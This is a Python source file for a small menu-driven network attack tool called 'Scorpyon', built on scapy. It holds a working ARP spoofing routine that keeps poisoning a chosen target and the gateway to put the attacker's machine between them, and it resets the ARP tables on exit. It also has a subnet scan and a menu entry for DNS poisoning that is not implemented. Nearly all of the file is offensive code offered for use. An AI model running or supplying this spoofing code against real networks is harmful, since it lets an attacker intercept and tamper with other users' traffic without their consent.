import sys
import scapy.all as scapy
import time
import ipaddress

def scan_network():
    try:
        local_ip=scapy.get_if_addr(scapy.conf.iface)
        network_range=ipaddress.ip_network(f"{local_ip}/24", strict=False)
    except Exception as e:
        print(f"Could not determine network range: {e}")
        return
    print(f"Scanning {network_range}...")
    arp_request=scapy.ARP(pdst=str(network_range))
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet=broadcast / arp_request
    try:
        answered, unanswered=scapy.srp(packet, timeout=10, verbose=False)
    except PermissionError:
        print("Permission denied. Run as root/Administrator.")
        return
    clients=[]
    for sent, received in answered:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("\nIP Address\t\tMAC Address")
    for client in clients:
        print(f"{client['ip']}\t\t{client['mac']}")
    main()
def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broadcast/arp_req
    answered_list=scapy.srp(arp_req_broadcast, timeout=10, verbose = False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None
def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    if not target_mac:
        print(f"\nCould not find MAC for {target_ip}. Host may be down.")
        return
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)
def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    print("[...Scorpyon...]")
    print("1. ARP spoofing \n2. DNS poisoning\n3. Scan network")
    choice=input("> ")    
    if choice=='1':
        target_ip=input("Please input the target IP: ")
        gateway_ip=scapy.conf.route.route("0.0.0.0")[2]
        try:
            sent_packets=0
            print("Starting ARP spoofing... Press Ctrl+C to stop.")
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                sent_packets+=2
                print(f"\rPackets sent: {sent_packets}", end ="")
                time.sleep(10)
        except KeyboardInterrupt:
            print("\nResetting ARP tables...")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            print("Done. Bye.")
    elif choice == '3':
        scan_network()
    else:
        print("Functionality not implemented yet.")

main()
